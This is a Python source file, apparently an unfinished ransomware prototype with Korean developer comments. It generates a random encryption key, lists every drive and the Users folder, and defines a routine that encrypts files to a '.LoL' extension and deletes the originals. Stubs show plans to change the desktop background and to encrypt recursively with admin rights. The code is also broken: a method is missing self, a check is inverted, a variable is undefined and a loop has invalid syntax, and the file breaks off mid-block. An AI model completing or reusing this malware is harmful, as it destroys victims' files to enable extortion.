import threading, pathlib, nacl, tkinter
import os, sys, nacl.secret
from PIL import Image, ImageDraw, ImageFont
from time import sleep


class encrypt():
    def __init__(self, targetFile=0, encryptModule=0):
        self._targetFile=targetFile
        self._encryptModule=encryptModule

    def encryptFile():
        try:
            if(os.path.isdir(self._targetFile)!=True):#파일이라면
                if(self._targetFile!=sys.argv[0]):#현재의 파이썬 스크립트를 암호화하려하면 종료
                    return
                
                with open(self._targetFile, "rb") as File:
                    data=File.read()
                encryptedFile=self._encryptModule.encrypt(data)
                with open(f"{self._targetFile}.LoL", "wb") as File:
                    File.write(encryptedFile)
                os.remove(self._targetFile)
                
        except Exception as e:
            print(f"[DEBUG] Error on encrypt.encryptFile(): {e}")

Key=nacl.utils.random(nacl.secret.SecretBox.KEY_SIZE)
EncryptModule=nacl.secret.SecretBox(Key)

PathList=[r"C:\Users\\"]
for letter in range(97, 123):
    drive=f"{chr(letter)}:\\"
    if (pathlib.Path(drive).exists()):#존재하는 드라이브명 ex F:\\이면 추가
        PathList.append(drive)
PathList.remove("c:\\")

print(f"[DEBUG] Key: {Key}")
print(f"[DEBUG] PathList: {PathList}")

def changeBackground():
    pass

def recursiveEncrypt(dir):#객체를 언제 생성할 것인가? 1. 매 파일마다 객체 생성? 디렉토리별로 객체생성? 드라이브별로 객체생성? 스레드 내부에서 객체생성?
    pass

if __name__ == '__main__':
    if(isAdmin):
        changeBackground()
        for pathElement: pathList:
              try: #드라이브 별로 스레드작업? 안정성을 위해 작업하다가 exception발생한 경우 복구하는 것도 중요. 다만 지금코드는 마지막에 원본삭제.
                  
                          
                      
